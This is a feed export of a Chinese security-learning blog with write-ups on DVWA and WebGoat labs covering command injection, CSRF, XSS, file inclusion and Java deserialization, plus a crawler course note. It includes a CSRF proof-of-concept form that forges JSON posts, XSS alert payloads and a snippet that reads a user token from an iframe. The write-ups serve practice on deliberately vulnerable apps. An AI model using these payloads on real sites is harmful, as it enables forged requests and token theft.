alt="image-20231128153521652"></p><p>这里先对输入的ip进行分段检测然后再拼贴</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126590.png" alt="image-20231128154222514"></p><p>使用加工后的ip执行ping，这里ip必须为数字并且长度只能为4段，限制得很死</p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126591.png" alt="image-20231128155233024"></p><p>这里进行了一个黑名单过滤，但是黑名单有了一些意义不明的空格~</p><p>其实能用的方法基本上都被过滤了，剩下的可能是一些异或等方法了</p><p><a href="https://blog.csdn.net/qq_61778128/article/details/127063407">无数字字母rce总结（取反、异或、自增、临时文件）_MUNG东隅的博客-CSDN博客</a></p><p>好像还是不行hh~</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>csrf主要是前端的问题，简单审计一下</p><h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126592.png" alt="image-20231128160129804"></p><p>这里注入点被md5编码了，那么应该也无法使用报错注入。。</p><p>回到漏洞本身，我们通常使用的csrf检测手段是删除referer，如果请求依然成功判定为存在csrf漏洞，csrf token的防御是在每个会话上加一个token确保会话和用户身份的绑定，我们再看一眼中等难度，他没有使用csrf token，所以我们随便制作一个链接就可以进行csrf攻击，而这里可能需要借助一些xss来获取其他用户的token</p><p>这里补充一下：frames[0].document.getElementsByName(‘user_token’)使读取cookie的xsspayload</p><blockquote><p>frames[0].document.getElementsByName(‘user_token’)<br>在前端开发中，<code>frames</code> 是一个 JavaScript 对象，表示当前窗口或文档中包含的所有 <code>&lt;frame&gt;</code> 或 <code>&lt;iframe&gt;</code> 元素的集合。它提供了对嵌套框架（即内嵌页面）的访问和控制。</p><p>在这种情况下，<code>frames[0]</code> 表示当前文档中第一个 frame 或 iframe 元素，<code>.document</code> 属性用于访问该 frame 或 iframe 的文档对象，<code>getElementsByName(&#39;user_token&#39;)</code> 则是在该文档中根据名称获取元素的方法。</p></blockquote><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126593.png" alt="image-20231128162032027"></p><h3 id="fnmatch"><a href="#fnmatch" class="headerlink" title="fnmatch()"></a>fnmatch()</h3><p><a href="https://www.w3school.com.cn/php/func_filesystem_fnmatch.asp">PHP fnmatch() 函数 (w3school.com.cn)</a></p><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><pre><code>fnmatch(pattern,string,flags)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>pattern</em></td><td align="left">必需。规定要检索的模式。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定要检查的字符串或文件。</td></tr><tr><td align="left"><em>flags</em></td><td align="left">可选。</td></tr></tbody></table><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>此函数对于文件名尤其有用，但也可以用于普通的字符串。普通用户可能习惯于 shell 模式或者至少其中最简单的形式 ‘?’ 和 ‘*’ 通配符，因此使用 fnmatch() 来代替 ereg() 或者 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便。</p><p>这道题的话写个file就可以进行目录穿越了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126594.png" alt="image-20231128193808682"></p><p>直接file协议读取也可以。</p><p>先写到这里，等考完之后再写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;都只尝试审计一下高难度，顺带练习一下代码审计工具,这里impassible难度是已经防御好的，high是高难度，我们主要关注这两个部分的源码</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化前瞻</title>
    <link href="https://taninluv.github.io/2023/11/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%9E%BB/"/>
    <id>https://taninluv.github.io/2023/11/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%9E%BB/</id>
    <published>2023-11-27T02:06:38.000Z</published>
    <updated>2023-11-27T08:59:04.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>给java反序列化上个引子，顺带把webgoat代码审计结束了</p><p>本来要开始学链子了，但是网警和技侦要开始考试了，打算突击一下ctf和代码审计，下个月在正式学习java反序列化</p><p><a href="https://www.runoob.com/java/java-files-io.html">Java 流(Stream)、文件(File)和IO | 菜鸟教程 (runoob.com)</a></p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><blockquote><p>Java 序列化是一种将对象转换为字节流的过程，以便可以将对象保存到磁盘上，将其传输到网络上，或者将其存储在内存中，以后再进行反序列化，将字节流重新转换为对象。</p><p>序列化在 Java 中是通过 <strong>java.io.Serializable</strong> 接口来实现的，该接口没有任何方法，只是一个标记接口，用于标识类可以被序列化。</p><p>当你序列化对象时，你把它包装成一个特殊文件，可以保存、传输或存储。反序列化则是打开这个文件，读取序列化的数据，然后将其还原为对象，以便在程序中使用。</p><p>序列化是一种用于保存、传输和还原对象的方法，它使得对象可以在不同的计算机之间移动和共享，这对于分布式系统、数据存储和跨平台通信非常有用。</p></blockquote><h1 id="Java-流-Stream-、文件-File-和IO"><a href="#Java-流-Stream-、文件-File-和IO" class="headerlink" title="Java 流(Stream)、文件(File)和IO"></a>Java 流(Stream)、文件(File)和IO</h1><blockquote><p>Java.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。</p><p>Java.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。</p><p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p><p>Java 为 I&#x2F;O 提供了强大的而灵活的支持，使其更广泛地应用到文件传输和网络编程中。</p></blockquote><p><img src="https://www.runoob.com/wp-content/uploads/2013/12/iostream2xx.png" alt="img"></p><h1 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h1><p><a href="https://www.w3cschool.cn/java/java-reflex.html">java反射机制深入理解剖析_w3cschool</a></p><blockquote><p>在java开发中有一个非常重要的概念就是java反射机制，也是java的重要特征之一。反射的概念是由Smith在1982年首次提出的，主要是指程序可以访问、检测和修改它本身状态或行为的一种能力，通过反射可以调用私有方法和私有属性，大部分框架也都是运用反射原理的。java通常是先有类再有对象，有对象就可以调用方法或者属性，java中的反射其实是通过Class对象来调用类里面的方法。掌握了反射的知识，才能更好的学习java高级课程。</p></blockquote><p>一个类有多个组成部分，例如:成员变量、方法、构造方法等，反射就是加载类,并解剖出类的各个组成部分。</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127110009212.png" alt="image-20231127110009212"></p><h1 id="序列化过程简单演示"><a href="#序列化过程简单演示" class="headerlink" title="序列化过程简单演示"></a>序列化过程简单演示</h1><p>先创建一个类Person.java</p><pre><code>package test;import java.io.Serializable;public class Person implements Serializable &#123;    private String username;    public int age;    public Person(String username, int age) &#123;        this.username = username;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;person&#123;&quot; +                &quot;username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127151420206.png" alt="image-20231127151420206"></p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化文件 SerializationTest.java</p><pre><code>package test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class SerializationTest &#123;    public static void serialize(Object object) throws IOException&#123;        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(object);    &#125;    public static void main(String[] args) throws Exception&#123;        Person person = new Person(&quot;water3&quot;,23);        serialize(person);        System.out.println(&quot;serialize:&quot;+person);    &#125;&#125;</code></pre><p><strong>序列化对象：</strong> 使用 ObjectOutputStream 类来将对象序列化为字节流</p><p>这里新创建了一个FileOutputStream类来接受序列化对象，该类用来创建一个文件并向文件中写数据。</p><p>如果该流在打开文件进行输出前，目标文件不存在，那么该流会创建该文件。</p><p>有两个构造方法可以用来创建 FileOutputStream 对象。</p><p>使用字符串类型的文件名来创建一个输出流对象：</p><pre><code>OutputStream f = new FileOutputStream(&quot;C:/java/hello&quot;)</code></pre><p>也可以使用一个文件对象来创建一个输出流来写文件。我们首先得使用File()方法来创建一个文件对象：</p><pre><code>File f = new File(&quot;C:/java/hello&quot;); OutputStream fOut = new FileOutputStream(f);</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code>package test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInput;import java.io.ObjectInputStream;public class UnserializationTest &#123;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));        Object object = objectInputStream.readObject();        return object;    &#125;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        Person person = (Person) unserialize(&quot;ser.bin&quot;);        System.out.println(&quot;unserialize&quot;+person);    &#125;&#125;</code></pre><p>这里也可以提前创建个空person对象来接收反序列化后的person对象</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127151513258.png" alt="image-20231127151513258"></p><h1 id="Webgoat-反序列化"><a href="#Webgoat-反序列化" class="headerlink" title="Webgoat 反序列化"></a>Webgoat 反序列化</h1><p>这道题一直不成功，但还是审计一下：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163148626.png" alt="image-20231127163148626"></p><p>首先对传入的字符串进行解码，然后进行反序列化，用o接受反序列化之后的对象，最后判断是否为VulnerableTaskHolder的实例</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163335284.png" alt="image-20231127163335284"></p><p>最下面是判断执行时间是否在3到7秒</p><p>我们再看一看这个危险类：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163555555.png" alt="image-20231127163555555"></p><p>这里和例题一样，使用taskAction来rce</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163838608.png" alt="image-20231127163838608"></p><p>从自定义的序列化过程来看，对象必须是十分钟之内创建的，然后rce必须以ping或者sleep开头</p><p>payload应该是这样：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127165418906.png" alt="image-20231127165418906"></p><p>但是根据回显在时间判断出了点问题，后来想起来在之前做题的时候发现docker的时间和我的系统时间是对不上的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;给java反序列化上个引子，顺带把webgoat代码审计结束了&lt;/p&gt;
&lt;p&gt;本来要开始学链子了，但是网警和技侦要开始考试了，打算突击一下c</summary>
      
    
    
    
    
    <category term="java" scheme="https://taninluv.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>爬虫</title>
    <link href="https://taninluv.github.io/2023/11/26/%E7%88%AC%E8%99%AB/"/>
    <id>https://taninluv.github.io/2023/11/26/%E7%88%AC%E8%99%AB/</id>
    <published>2023-11-26T06:54:21.000Z</published>
    <updated>2023-11-26T07:35:41.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>这是大数据隐私保护课程的实验-自动化新闻采集，只是简单的实验和记录，不作深入研究</p><h1 id="反爬虫机制"><a href="#反爬虫机制" class="headerlink" title="反爬虫机制"></a>反爬虫机制</h1><ul><li>robots.txt</li><li>IP封锁和频率限制</li><li>验证码</li><li>User-Agent检测</li><li>动态内容生成</li><li>Honypot技术</li><li>反反爬虫技术</li></ul><h1 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h1><p>谷歌新闻提供的rss，也就是xml的数据非常方便于信息采集：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126151612390.png" alt="image-20231126151612390"></p><p>半结构化的数据，但是谷歌有被反爬的风险</p><h1 id="百度新闻"><a href="#百度新闻" class="headerlink" title="百度新闻"></a>百度新闻</h1><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126152110282.png" alt="image-20231126152110282"></p><p><a href="https://www.baidu.com/s?rtt=1&bsst=1&cl=2&tn=news&ie=utf-8&word=%E6%BB%91%E5%9D%A1">https://www.baidu.com/s?rtt=1&amp;bsst=1&amp;cl=2&amp;tn=news&amp;ie=utf-8&amp;word=%E6%BB%91%E5%9D%A1</a></p><p>这里我们关注一下url的传参：</p><ul><li><p>rtt</p></li><li><p>bsst</p></li><li><p>cl</p></li><li><p>tn</p></li><li><p>ie</p></li><li><p>word</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126153106262.png" alt="image-20231126153106262"></p></li></ul><p>找到返回的报文观察我们需要爬取的字段特征</p><h1 id="beautifulsoup"><a href="#beautifulsoup" class="headerlink" title="beautifulsoup"></a>beautifulsoup</h1><p>from bs4 import BeautifulSoup</p><p><a href="https://zhuanlan.zhihu.com/p/128484144">https://zhuanlan.zhihu.com/p/128484144</a></p><p>解析-筛选-</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h1&gt;&lt;p&gt;这是大数据隐私保护课程的实验-自动化新闻采集，只是简单的实验和记录，不作深入研究&lt;/p&gt;
&lt;h1 id=&quot;反爬虫机制&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
    <category term="爬虫" scheme="https://taninluv.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-CSRF</title>
    <link href="https://taninluv.github.io/2023/11/24/WebGoat-CSRF/"/>
    <id>https://taninluv.github.io/2023/11/24/WebGoat-CSRF/</id>
    <published>2023-11-24T09:21:39.000Z</published>
    <updated>2023-11-25T08:20:23.020Z</updated>
    
    <content type="html"><![CDATA[<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>这题模拟一个简单的csrf，从外源触发这个表单就可以得到flag：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619320.png" alt="image-20231125141114780"></p><p>抓包，然后使用插件制作一个payload，简单看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619321.png" alt="image-20231125141428817"></p><p>相当于创建了一个表单，然后让他生成相同内容的请求包，但是这个表单显然比较初级，可以加入一些自动触发的dom事件在打开链接时自动触发提交表单，这里主要做代码审计，故不多做演示</p><p>打开burp pro比较麻烦，这里直接复制源码的表单元素，然后放到wolf触发：</p><pre><code>&lt;form accept-charset=&quot;UNKNOWN&quot; id=&quot;basic-csrf-get&quot; method=&quot;POST&quot; name=&quot;form1&quot; target=&quot;_blank&quot; successcallback=&quot;&quot; action=&quot;/WebGoat/csrf/basic-get-flag&quot;&gt;        &lt;input name=&quot;csrf&quot; type=&quot;hidden&quot; value=&quot;false&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619323.png" alt="image-20231125142631045"></p><p>点击提交即可</p><p>进入源码审计：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619324.png" alt="image-20231125143654426"></p><p>这里我们先跳过第一个判断，因为从我们抓到的包来看，我们的referer包头不为null。</p><p>当refererArr[2]不等于host的时候，我们进入else块，此时我们能拿到flag，修改包试一试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619325.png" alt="image-20231125144000683"></p><p>把8080端口改为8081，发现返回了flag</p><p>再回到源码，我们看到当referer为null的时候也可以success：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619326.png" alt="image-20231125144323608"></p><p>进入这个控制块好像无论如何都会success：</p><p>删除referer：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619327.png" alt="image-20231125144525087"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619328.png" alt="image-20231125144506097"></p><p>此时csrf为true还是false或者其他值都无关紧要</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619329.png" alt="image-20231125144634807"></p><p>但是这里有个问题时既然要不同源，为何检查referer而不是origin，挺奇怪的</p><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>这里让代表当前登录的用户触发评论提交。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619330.png" alt="image-20231125145329540"></p><p>这里的解法和上题差不多，我们看看源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619331.png" alt="image-20231125150302262"></p><p>这里的逻辑和上题大差不差，这里看看这个<code>weakAntiCSRF</code>:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619332.png" alt="image-20231125150355356"></p><p>我们发现这个令牌是静态的</p><p>而且最后的评论：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619333.png" alt="image-20231125152348104"></p><p>依然是我发起的，显而易见这个静态的token标记了我的身份，这里简单搜索了一下csrf token：</p><p><a href="https://blog.csdn.net/yexudengzhidao/article/details/93527586">CSRF防御之token认证_csrf token-CSDN博客</a></p><blockquote><p>CSRF Token的防护策略分为三个步骤：</p><p>将CSRF Token输出到页面中</p><p>首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p>页面提交的请求携带这个Token</p><p>对于GET请求，Token将附在请求地址之后，这样URL 就变成 <a href="http://url/?csrftoken=tokenvalue%E3%80%82">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上：</p>  <input type="hidden" name="csrftoken" value="tokenvalue"/>1这样，就把Token以参数的形式加入请求了。<p>服务器验证Token是否正确<br>当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。<br>总结：<br>Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。</p></blockquote><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>这道题跟前面的有些区别，就是在提交表单时，name和value之间会自动填充一个 <code>=</code>，这道题要上传一段json数据，此时我们需要处理这个<code>=</code>，因为我们上传的数据全都在json中：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619334.png" alt="image-20231125155326738"></p><p>此时我们并不需要<code>=</code>，解决办法是把这个<code>=</code>放在无关紧要的数据中，比如这里的message：</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://172.20.10.3:8080/WebGoat/csrf/feedback/message&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;&amp;#123;&amp;quot;name&amp;quot;&amp;#58;&amp;quot;webgoat&amp;quot;&amp;#44;&amp;quot;email&amp;quot;&amp;#58;&amp;quot;webgoat&amp;#64;webgoat&amp;#46;org&amp;quot;&amp;#44;&amp;#13;&amp;#10;&amp;quot;subject&amp;quot;&amp;#58;&amp;quot;suggestions&amp;quot;&amp;#44;&amp;quot;message&amp;quot;&amp;#58;&amp;quot;&quot; value=&quot;WebGoat&amp;#32;is&amp;#32;the&amp;#32;best&amp;#33;&amp;#33;&amp;quot;&amp;#125;&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>让name&#x3D;<code>&#123;&quot;name&quot;:&quot;webgoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;, &quot;subject&quot;:&quot;suggestions&quot;,&quot;message&quot;:&quot;</code></p><p>value&#x3D;<code>WebGoat is the best!!&quot;</code></p><p>拼接后，name字段中末尾多出的<code>&quot;</code>和value中的闭合，就有了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619335.png" alt="image-20231125155921749"></p><p>实际上是<code>&#123;&quot;name&quot;:&quot;webgoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;, &quot;subject&quot;:&quot;suggestions&quot;,&quot;message&quot;:&quot;</code>&#x3D;<code>WebGoat is the best!!&quot;</code></p><p>除了构造上的区别，其他跟之前一样</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619336.png" alt="image-20231125160046102"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619337.png" alt="image-20231125160356976"></p><p>contenttype需要修改，host和referer不同</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619338.png" alt="image-20231125160536993"></p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p>这道题挺迷惑的，看了一下别人的解释：</p><p><a href="https://www.freebuf.com/column/221947.html">历史最全 WebGoat 8.0 通关攻略 - FreeBuf网络安全行业门户</a></p><blockquote><h4 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h4><p>这一题按照题目要求，注册个csrf-开头的用户，比如我的用户名为tntaxin，然后我再注册一个csrf-tntaxin,然后登录csrf-tntaxin访问这道题目，点击solved就过了，当然这题的真实目的是希望你构建一个csrf 恶意链接，然后访问这个链接就会自动登录csrf-tntaxin这个账户，这样受害者的访问记录你就都知道了。</p></blockquote><p>也就是说别人不知道登录了我们的账户，我们从历史记录里面可以盗取别人的访问记录</p><p>源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619339.png" alt="image-20231125161832665"></p><p>当一个以csrf-xxx为用户名的用户登录后，会给xxx用户标记为成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;3&quot;&gt;&lt;a href=&quot;#3&quot; class=&quot;headerlink&quot; title=&quot;3&quot;&gt;&lt;/a&gt;3&lt;/h1&gt;&lt;p&gt;这题模拟一个简单的csrf，从外源触发这个表单就可以得到flag：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuserc</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="CSRF" scheme="https://taninluv.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-XSS</title>
    <link href="https://taninluv.github.io/2023/11/24/WebGoat-XSS/"/>
    <id>https://taninluv.github.io/2023/11/24/WebGoat-XSS/</id>
    <published>2023-11-24T02:40:16.000Z</published>
    <updated>2023-11-25T06:12:20.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-7"><a href="#xss-7" class="headerlink" title="xss-7"></a>xss-7</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411125.png" alt="image-20231124110348679"></p><p>这里直接点击购买看一下有哪些数据可以回显，然后发现是card number，然后在card number这个输入框注入代码:</p><pre><code>&lt;scrpt&gt;alert(&#39;xxx&#39;)&lt;/scrpt&gt;or&lt;scrpt&gt;console.log(&#39;xxx&#39;)&lt;/scrpt&gt;</code></pre><p>源码部分：</p><p><a href="https://blog.csdn.net/zhuying123jl/article/details/120846994">Java Pattern compile(String)用法及代码示例_pattern.compile_yinger553的博客-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411126.png" alt="image-20231124143843279"></p><p>写了一个正则匹配</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411127.png" alt="image-20231124144119278"></p><p>这里我们可以看到field1也就是card number我们是可以控制的，并且只是简单的拼接没有经过过滤，而这里根据前后文来看他有一些html标签，说明前端会解析我们的字符串，我们必定是可以进行xss注入的</p><h1 id="Reflected-and-DOM-Based-XSS"><a href="#Reflected-and-DOM-Based-XSS" class="headerlink" title="Reflected and DOM-Based XSS"></a>Reflected and DOM-Based XSS</h1><blockquote><p>反射式和基于DOM的XSS 基于DOM的XSS是反射XSS的另一种形式。两者都是通过发送带有反映到浏览器的输入的链接来触发的。DOM和“传统”反射XSS之间的区别在于，使用DOM，负载永远不会到达服务器。它将只由客户端处理。 攻击者向受害者发送恶意URL 受害者点击链接 该链接可能加载恶意网页或他们使用的（已登录？）具有易受攻击的路由&#x2F;处理程序的网页 如果是恶意网页，它可能会使用自己的JavaScript使用易受攻击的路由&#x2F;处理程序攻击另一个页面&#x2F;url 易受攻击的页面在该页面&#x2F;站点上呈现负载并在用户上下文中执行攻击 攻击者的恶意脚本可能使用本地帐户的权限运行命令 受害者没有意识到袭击发生了… 恶意攻击者不使用＜script＞alert（“xss”）&lt;&#x2F;script＞</p></blockquote><p>结合第八页：</p><blockquote><p>您应该能够使用上一个示例执行脚本。不过，在这一点上，它将被视为“self-XSS”。 为什么？ 这是因为没有任何链接会触发XSS</p></blockquote><p>反射性xss和dom型的xss的区别可能在于，反射型只能在本地自己触发，无法通过url发送给其他人让别人触发，我们先往下看一看dom xss：</p><h1 id="XSS-10"><a href="#XSS-10" class="headerlink" title="XSS-10"></a>XSS-10</h1><p>寻找在生产期间保留在应用程序中的测试代码的路由：</p><p>元素中检索route，发现只有一个：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411128.png" alt="image-20231124150020482"></p><p>按照路径到源代码中审计一下这个js文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411130.png" alt="image-20231124150117809"></p><p>找到了这个测试路由的片段，继续跟进一下这个方法：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411131.png" alt="image-20231124150718492"></p><p>&#x3D;》</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411132.png" alt="image-20231124150854700"></p><p>这里大概意思是查找一个.lesson-content的DOM元素，然后把html内容改为“test”+param，这里param显然是可以构造xss的</p><p>ok，那怎么传入参数呢？我们回到最开始的路由文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411133.png" alt="image-20231124152028792"></p><blockquote><ul><li><code>&#39;lesson/:name&#39;</code>: 当访问 <code>lesson/</code> 后接一个动态的 <code>name</code> 参数时，将触发 <code>lessonRoute</code> 方法。</li><li><code>&#39;lesson/:name/:pageNum&#39;</code>: 当访问 <code>lesson/</code> 后接一个动态的 <code>name</code> 参数和 <code>pageNum</code> 参数时，将触发 <code>lessonPageRoute</code> 方法。</li><li><code>&#39;test/:param&#39;</code>: 当访问 <code>test/</code> 后接一个动态的 <code>param</code> 参数时，将触发 <code>testRoute</code> 方法。</li></ul><p>这些路由规则中使用了冒号 <code>:</code> 定义了动态的 URL 参数部分，例如 <code>:name</code>、<code>:pageNum</code>、<code>:param</code>。当访问这些对应的 URL 时，这些参数会被传递给对应的路由处理函数。</p></blockquote><p>我们如何访问到对应的url呢？</p><p>看一下题目：</p><blockquote><p>对于本例，您将希望在路由处理程序中查找一些“测试”代码（WebGoat使用主干作为其主要JavaScript库）。有时，测试代码会留在生产中（而且测试代码通常非常简单，缺乏安全性或任何质量控制！）。 你的目标是找到路线并加以利用。不过，首先… 基本路线是什么？例如，请查看本课的URL…它应该看起来像&#x2F;WebGoat&#x2F;start.mvc#classic&#x2F;CrosSiteScripting.lesson&#x2F;9。本例中的“基本路由”是：start.mvc#classic&#x2F;   之后CrossSiteScripting.lesson&#x2F;9是由JavaScript路由处理程序处理的参数。 那么，在生产过程中留在应用程序中的测试代码的路径是什么呢？要回答这个问题，您必须检查JavaScript源代码。</p></blockquote><p>我们看到，start.mvc#classic&#x2F;是一个基本路由,这里先补充一下GPT的解释：</p><blockquote><p>在这个URL中：</p><ul><li><code>start.mvc</code> 可能是一个处理页面路由的 MVC（Model-View-Controller）模式中的控制器或者路由。</li><li><code>classic/CrosSiteScripting.lesson/9</code> 